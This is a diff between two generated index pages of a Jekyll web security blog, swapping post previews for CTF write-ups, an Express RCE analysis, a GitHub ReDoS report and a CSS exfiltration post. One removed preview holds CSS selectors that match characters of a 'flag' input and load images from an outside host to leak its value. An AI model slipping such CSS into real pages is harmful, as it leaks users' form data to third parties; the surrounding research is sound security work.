@@ -39,15 +39,16 @@
 <meta property="og:locale" content="en" />
 <meta name="description" content="A minimal, responsive and feature-rich Jekyll theme for technical writing." />
 <meta property="og:description" content="A minimal, responsive and feature-rich Jekyll theme for technical writing." />
-<link rel="canonical" href="http://localhost:4000/" />
-<meta property="og:url" content="http://localhost:4000/" />
+<link rel="canonical" href="http://localhost:4000/page2/" />
+<meta property="og:url" content="http://localhost:4000/page2/" />
 <meta property="og:site_name" content="Web2.0" />
 <meta property="og:type" content="website" />
-<link rel="next" href="http://localhost:4000/page2" />
+<link rel="prev" href="http://localhost:4000/" />
+<link rel="next" href="http://localhost:4000/page3" />
 <meta name="twitter:card" content="summary" />
 <meta property="twitter:title" content="Web2.0" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"WebSite","description":"A minimal, responsive and feature-rich Jekyll theme for technical writing.","headline":"Web2.0","name":"anonymous","sameAs":["https://x.com/l0ptus"],"url":"http://localhost:4000/"}</script>
+{"@context":"https://schema.org","@type":"WebPage","description":"A minimal, responsive and feature-rich Jekyll theme for technical writing.","headline":"Web2.0","url":"http://localhost:4000/page2/"}</script>
 <!-- End Jekyll SEO tag -->
 
   
@@ -673,14 +674,14 @@
 <div id="post-list" class="flex-grow-1 px-xl-1">
   
     <article class="card-wrapper card">
-      <a href="/posts/Just-CTF-2025/" class="post-preview row g-0 flex-md-row-reverse">
+      <a href="/posts/HTBCTF2023/" class="post-preview row g-0 flex-md-row-reverse">
         
 
         
 
         <div class="col-md-12">
           <div class="card-body d-flex flex-column">
-            <h1 class="card-title my-2 mt-md-0">JustCTF 2025 Positive Players Write Up</h1>
+            <h1 class="card-title my-2 mt-md-0">HTB apocalypse CTF 2023 spybug Write Up</h1>
 
             <div class="card-text content mt-0 mb-3">
               <p>
@@ -690,7 +691,16 @@
 
 
 
-                i joined in justctf 2025 to solve web challs, there were 7 web challs and i aimed to solve Simple Tasks and Positive Players. However Simple Tasks was really difficult that i couldn’t even approach...
+                spybug
+
+require(&quot;dotenv&quot;).config();
+
+const fs = require(&quot;fs&quot;);
+const path = require(&quot;path&quot;);
+const express = require(&quot;express&quot;);
+const session = require(&quot;express-session&quot;);
+
+const { createAdmin } =...
               </p>
             </div>
 
@@ -708,11 +718,11 @@
 
 <time
   
-  data-ts="1754179200"
+  data-ts="1679609629"
   data-df="ll"
   
 >
-  Aug  3, 2025
+  Mar 24, 2023
 </time>
 
 
@@ -730,14 +740,14 @@
     </article>
   
     <article class="card-wrapper card">
-      <a href="/posts/css-exfiltration/" class="post-preview row g-0 flex-md-row-reverse">
+      <a href="/posts/b01lers/" class="post-preview row g-0 flex-md-row-reverse">
         
 
         
 
         <div class="col-md-12">
           <div class="card-body d-flex flex-column">
-            <h1 class="card-title my-2 mt-md-0">CSS Exfiltration via attr() + image-set() from Chrome 133</h1>
+            <h1 class="card-title my-2 mt-md-0">b01lers CTF 2023 Write Up</h1>
 
             <div class="card-text content mt-0 mb-3">
               <p>
@@ -749,15 +759,7 @@
 
                 Summary
 
-input[name=flag][value^=a]{
-    background: url(&#39;https://evm.pics/a&#39;);
-}
-input[name=flag][value^=b]{
-    background: url(&#39;https://evm.pics/b&#39;);
-}
-/* ... */
-
-In most cases, when exploiting ...
+Cause I was lazy, I didn’t do ctf for a long time. If i say “cause I was busy”, it looks fucking stupid. When I’m solving, the time of ctf is only 5 hours, so i just decided to solve the w...
               </p>
             </div>
 
@@ -775,11 +777,11 @@ In most cases, when exploiting ...
 
 <time
   
-  data-ts="1744675200"
+  data-ts="1679264029"
   data-df="ll"
   
 >
-  Apr 15, 2025
+  Mar 20, 2023
 </time>
 
 
@@ -797,14 +799,14 @@ In most cases, when exploiting ...
     </article>
   
     <article class="card-wrapper card">
-      <a href="/posts/XSS-in-ML-Framework/" class="post-preview row g-0 flex-md-row-reverse">
+      <a href="/posts/RCE-Express-1/" class="post-preview row g-0 flex-md-row-reverse">
         
 
         
 
         <div class="col-md-12">
           <div class="card-body d-flex flex-column">
-            <h1 class="card-title my-2 mt-md-0">($10,890) What is XSS in the ML/AI ecosystem, not only web3.0?</h1>
+            <h1 class="card-title my-2 mt-md-0">Express, RCE via File Extension Confusing ≤ V4.18.2</h1>
 
             <div class="card-text content mt-0 mb-3">
               <p>
@@ -814,7 +816,18 @@ In most cases, when exploiting ...
 
 
 
-                Hi guys, i wanna introduce a way to earn $10k bounty on an open-source projects. a month ago, i reported a bug in the ML Framework. and the bug i found was not critical so i needed to find a way to...
+                
+  Summary
+  Function call procedure
+  The analysis
+    
+      /lib/application.js#L548L610
+      /lib/view.js#L52L95
+      /lib/application.js#L655L661
+      /lib/view.js#L133L136
+    
+  
+  How to...
               </p>
             </div>
 
@@ -832,11 +845,11 @@ In most cases, when exploiting ...
 
 <time
   
-  data-ts="1694656853"
+  data-ts="1671399713"
   data-df="ll"
   
 >
-  Sep 14, 2023
+  Dec 19, 2022
 </time>
 
 
@@ -854,14 +867,14 @@ In most cases, when exploiting ...
     </article>
   
     <article class="card-wrapper card">
-      <a href="/posts/ReDos-in-Github/" class="post-preview row g-0 flex-md-row-reverse">
+      <a href="/posts/Logic-req.query/" class="post-preview row g-0 flex-md-row-reverse">
         
 
         
 
         <div class="col-md-12">
           <div class="card-body d-flex flex-column">
-            <h1 class="card-title my-2 mt-md-0">0-Day, Copy and Paste ReDoS in github.com</h1>
+            <h1 class="card-title my-2 mt-md-0">Express, Querystring parameter limit of req.query</h1>
 
             <div class="card-text content mt-0 mb-3">
               <p>
@@ -872,13 +885,10 @@ In most cases, when exploiting ...
 
 
                 Summary
-In summary, I found a Self-ReDoS vulnerability in the issue feature of github.com and reported it to HackerOne.
 
+few days ago, i found an interesting logic in req.query() and call the qs module inside req.query(). the qs module limits a number of parameter and default limit number is 1000.
 
-Analysis
-
-function onPaste$1(event) {
-    const { currentTarget: el } = eve...
+so if we ...
               </p>
             </div>
 
@@ -896,11 +906,11 @@ function onPaste$1(event) {
 
 <time
   
-  data-ts="1691226053"
+  data-ts="1668894113"
   data-df="ll"
   
 >
-  Aug  5, 2023
+  Nov 20, 2022
 </time>
 
 
@@ -918,14 +928,14 @@ function onPaste$1(event) {
     </article>
   
     <article class="card-wrapper card">
-      <a href="/posts/Line-CTF/" class="post-preview row g-0 flex-md-row-reverse">
+      <a href="/posts/CCE/" class="post-preview row g-0 flex-md-row-reverse">
         
 
         
 
         <div class="col-md-12">
           <div class="card-body d-flex flex-column">
-            <h1 class="card-title my-2 mt-md-0">Line CTF 2023 Write Up</h1>
+            <h1 class="card-title my-2 mt-md-0">CCE 2022 Write Up</h1>
 
             <div class="card-text content mt-0 mb-3">
               <p>
@@ -935,18 +945,9 @@ function onPaste$1(event) {
 
 
 
-                
-  (Web) Baby Simple Gocurl 
-  (Web) Adult Simple Gocurl
+                After a long time I did ctf again. Actually, a few days ago, 김지섭님, a member of zer0pt, asked me to do CCE together, but I refused. The reason was because of work.
 
-
-These two challenges require reading flag in the /flag/ path via SSRF.
-
-
-
-(Web) Baby Simple Gocurl
-
-n.startsWith(&quot;https://&quot;) || n.startsWi...
+But I was able to find 5 XSS from...
               </p>
             </div>
 
@@ -964,11 +965,11 @@ n.startsWith(&quot;https://&quot;) || n.startsWi...
 
 <time
   
-  data-ts="1679821253"
+  data-ts="1664078453"
   data-df="ll"
   
 >
-  Mar 26, 2023
+  Sep 25, 2022
 </time>
 
 
@@ -996,8 +997,8 @@ n.startsWith(&quot;https://&quot;) || n.startsWi...
     <!-- left arrow -->
     
 
-    <li class="page-item disabled">
-      <a class="page-link" href="#" aria-label="previous-page">
+    <li class="page-item ">
+      <a class="page-link" href="/" aria-label="previous-page">
         <i class="fas fa-angle-left"></i>
       </a>
     </li>
@@ -1017,7 +1018,7 @@ n.startsWith(&quot;https://&quot;) || n.startsWi...
 
       
         <!-- show number -->
-        <li class="page-item  active">
+        <li class="page-item ">
           <a
             class="page-link"
             href="/"
@@ -1035,7 +1036,7 @@ n.startsWith(&quot;https://&quot;) || n.startsWi...
 
       
         <!-- show number -->
-        <li class="page-item ">
+        <li class="page-item  active">
           <a
             class="page-link"
             href="/page2"
@@ -1126,7 +1127,7 @@ n.startsWith(&quot;https://&quot;) || n.startsWi...
 
     <!-- mobile pagination -->
     <li class="page-index align-middle">
-      <span>1</span>
+      <span>2</span>
       <span class="text-muted">/ 7</span>
     </li>
 
@@ -1134,7 +1135,7 @@ n.startsWith(&quot;https://&quot;) || n.startsWi...
     
 
     <li class="page-item ">
-      <a class="page-link" href="/page2" aria-label="next-page">
+      <a class="page-link" href="/page3" aria-label="next-page">
         <i class="fas fa-angle-right"></i>
       </a>
     </li>
